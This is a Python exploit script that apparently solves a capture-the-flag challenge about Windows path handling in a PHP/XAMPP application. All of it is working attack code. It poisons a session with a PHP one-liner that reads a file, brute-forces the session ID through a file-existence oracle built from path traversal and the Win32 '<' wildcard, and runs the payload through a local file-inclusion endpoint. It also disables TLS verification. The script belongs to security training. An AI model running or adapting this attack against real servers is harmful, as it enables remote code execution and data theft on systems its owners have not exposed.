#!/usr/bin/env python3
"""
09 - Windows Path Madness : automated exploit.

  1. poison the shared visitor-book session with a PHP one-liner
  2. use ?op=creatimg&font=... as a "does this path exist" oracle and brute
     force the 26-character session id one character at a time, using the
     DOS-device wildcard '<' (which Win32 expands like '*')
  3. feed the now-known session filename to the ?op=tplcache include and read
     the flag out of the response

Python 3 standard library only.
"""
import http.client
import re
import sys
import threading
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://challenge"

# C:\xampp\htdocs\statics\fonts\  ->  C:\xampp\tmp\
TMP_FROM_FONTS = "../../../tmp/"

# The alphabet this box uses: session.sid_bits_per_character = 5, which is
# what php.ini-production (and php.ini-development) recommend and what this
# lab sets explicitly.  It is NOT PHP's compiled-in default - that is
# sid_bits_per_character = 4 with sid_length = 32, i.e. 32 hex characters.
CHARSET = "0123456789abcdefghijklmnopqrstuv"
# ... and the fallback for a box left at 4, or configured with 6, bits per
# character (6 bits adds 'w'-'z', 'A'-'Z', '-' and ',').
CHARSET_WIDE = "0123456789abcdefghijklmnopqrstuvwxyzABCDEF-,"

DOS_STAR = "<"          # Win32 expands this like '*'
SID_MAX = 64
WORKERS = 12

_tls = threading.local()
_counter = [0]          # every HTTP request this script completes
_oracle = [0]           # ... of which, ?op=creatimg oracle queries
_counter_lock = threading.Lock()


def conn():
    """One keep-alive connection per worker thread."""
    c = getattr(_tls, "conn", None)
    if c is None:
        u = urllib.parse.urlsplit(BASE)
        port = u.port or (443 if u.scheme == "https" else 80)
        if u.scheme == "https":
            import ssl
            c = http.client.HTTPSConnection(u.hostname, port, timeout=15,
                                            context=ssl._create_unverified_context())
        else:
            c = http.client.HTTPConnection(u.hostname, port, timeout=15)
        _tls.conn = c
    return c


def get(path):
    for attempt in (0, 1):
        c = conn()
        try:
            c.request("GET", path, headers={"Connection": "keep-alive"})
            r = c.getresponse()
            body = r.read()
            with _counter_lock:
                _counter[0] += 1
            return r.status, body
        except Exception:
            try:
                c.close()
            except Exception:
                pass
            _tls.conn = None
            if attempt:
                raise
    raise RuntimeError("unreachable")


def q(**kw):
    return "/api.php?" + urllib.parse.urlencode(kw)


def exists(winpath):
    """The oracle: 200 (a PNG comes back) means Win32 found a match."""
    status, _ = get(q(op="creatimg", txt="1337", font=winpath))
    with _counter_lock:
        _oracle[0] += 1
    return status == 200


def sess_exists(name):
    return exists(TMP_FROM_FONTS + name)


def poison(payload):
    status, body = get(q(op="sign", name=payload))
    if status != 200:
        sys.exit(f"[-] could not sign the visitor book (HTTP {status})")


def brute_sid(charset):
    """Grow the session id one character at a time through the oracle.

    Candidates are probed in parallel batches of WORKERS and the loop stops at
    the first batch that contains a hit.  Note what that costs: `pool.map` is
    eager, so a whole batch is always issued even when the answer is its first
    element.  A 32-symbol alphabet splits into batches of 12, 12 and 8, so a
    position costs 12, 24 or 32 probes with probability 12/32, 12/32, 8/32 -
    (12*12 + 12*24 + 8*32) / 32 = 21.5 on average, against the 16.5 a strictly
    sequential search would average.  But a sequential search would take up to
    32 round trips per position instead of at most 3.  The trade is deliberate:
    ~3x fewer round trips for ~30% more requests.  A final full sweep of the
    alphabet (32 probes) is what tells the loop the id has ended.  See
    WRITEUP.md for the measured totals.
    """
    prefix = ""
    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
        while len(prefix) < SID_MAX:
            found = None
            for i in range(0, len(charset), WORKERS):
                batch = charset[i:i + WORKERS]
                probe = lambda c: (c, sess_exists(f"sess_{prefix}{c}{DOS_STAR}"))
                for c, ok in pool.map(probe, batch):
                    if ok:
                        found = c
                        break
                if found is not None:
                    break
            if found is None:
                return prefix
            prefix += found
            print(f"[*] char {len(prefix):2d} = {found!r}   sess_{prefix}")
    return prefix


def main():
    print(f"[*] target {BASE}")

    payload = "<?php echo file_get_contents('/flag.txt'); ?>"
    poison(payload)
    print("[+] visitor book signed with a PHP one-liner")

    # sanity: the oracle must distinguish a real font from a missing one
    if not exists("default.ttf") or exists("nope.ttf"):
        sys.exit("[-] the creatimg endpoint is not behaving like an oracle")
    print("[+] oracle works (200 = found, 404 = not found)")

    if not sess_exists("sess_" + DOS_STAR):
        sys.exit("[-] no sess_* file in C:\\xampp\\tmp\\")
    print("[+] at least one session file exists in C:\\xampp\\tmp\\")

    sid = brute_sid(CHARSET)
    if len(sid) < 20:
        print("[*] retrying with the wide sid alphabet")
        sid = brute_sid(CHARSET_WIDE)

    if not sess_exists(f"sess_{sid}"):
        sys.exit(f"[-] sess_{sid} does not resolve without a wildcard")
    print(f"[+] session file: C:\\xampp\\tmp\\sess_{sid}  ({_oracle[0]} oracle queries)")

    status, body = get(q(op="tplcache", tpl=f"sess_{sid}"))
    if status != 200:
        sys.exit(f"[-] tplcache refused the include (HTTP {status})")
    text = body.decode("utf-8", "replace")
    print(f"[+] included the session file, {len(body)} bytes back")

    m = re.search(r"PHRACK\{[^}]*\}", text)
    if not m:
        sys.exit(f"[-] no flag in the response:\n{text[:400]}")
    print(f"[*] {_oracle[0]} oracle queries, {_counter[0]} HTTP requests total")
    print(f"FLAG: {m.group(0)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
